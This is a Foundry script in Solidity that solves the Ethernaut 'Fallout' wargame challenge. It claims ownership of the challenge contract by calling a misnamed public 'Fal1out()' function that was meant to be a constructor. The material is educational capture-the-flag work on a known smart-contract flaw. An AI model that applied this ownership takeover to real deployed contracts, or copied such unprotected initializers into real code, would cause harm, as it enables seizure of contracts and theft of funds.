// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";

interface Fallout {
    function Fal1out() external;
    function owner() external view returns (address);
}

/// @author agadzhalov
/// @title Solution to Fallout Ethernaut challange
/// @notice Solution: call the misnamed `Fal1out()` function to claim ownership. This function is public 
///         and was intended to be a constructor, allowing anyone to call it and become the owner.
contract FalloutScript is Script {
    /// @notice The deployed Fallout contract address.
    Fallout public fallout = Fallout(0xc0f87bB1Da61b1Efd4e1F4fc59a6903A647e6f23);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. Log the current owner of the Fallout contract
        console.log("1. Current owner is", fallout.owner());

        // 2. Exploit
        fallout.Fal1out();

        // 3. Log the new owner after claiming ownership
        console.log("2. New owner is", fallout.owner());

        vm.stopBroadcast();
    }
}
